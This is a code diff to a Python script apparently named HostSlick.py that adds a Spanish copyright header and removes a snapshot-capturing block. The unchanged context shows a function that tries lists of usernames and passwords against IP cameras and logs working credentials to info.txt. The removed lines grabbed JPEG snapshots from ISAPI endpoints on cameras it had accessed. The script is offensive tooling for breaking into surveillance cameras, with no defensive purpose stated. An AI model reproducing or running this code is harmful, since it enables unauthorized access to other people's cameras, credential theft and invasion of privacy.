@@ -1,3 +1,11 @@
+"""
+Nombre del archivo: HostSlick.py
+Autor: SlickMercy
+Fecha de creación: 1 de junio de 2023
+Descripción: TG: SlickMercy.
+
+Este código está sujeto a derechos de autor. Todos los derechos están reservados.
+"""
 import asyncio
 import ipaddress
 import os
@@ -55,22 +63,6 @@ async def check_camera(ip, usernames, passwords, port=80):
                         info_filename = "info.txt"
                         with open(info_filename, "a") as f:
                             f.write(f"IP: {ip}, Username: {username}, Password: {password}, Channel: {channel}\n")
-
-                        # Reproducir el flujo antes de tomar la instantánea
-                        play_url = f"http://{ip}:{port}/ISAPI/Streaming/channels/{channel}01/playback"
-                        async with session.put(play_url, headers=headers, timeout=15):
-                            await asyncio.sleep(2)  # Esperar un tiempo para que el flujo se reproduzca
-
-                        # Tomar la instantánea
-                        snapshot_url = f"http://{ip}:{port}/ISAPI/Image/channels/{channel}01"
-                        async with session.get(snapshot_url, headers=headers, timeout=15) as response:
-                            if response.status == 200 and response.headers.get("Content-Type") == "image/jpeg":
-                                image_data = await response.read()
-                                # Guardar la instantánea
-                                snapshot_filename = f"snapshot_{ip}_{username}_{password}_{port}_{channel}.jpg"
-                                with open(snapshot_filename, "wb") as f:
-                                    f.write(image_data)
-                                print(Fore.BLUE + f"[+] Saved snapshot from camera {ip} channel {channel}" + Style.RESET_ALL)
 
             if camera_found:
                 return True
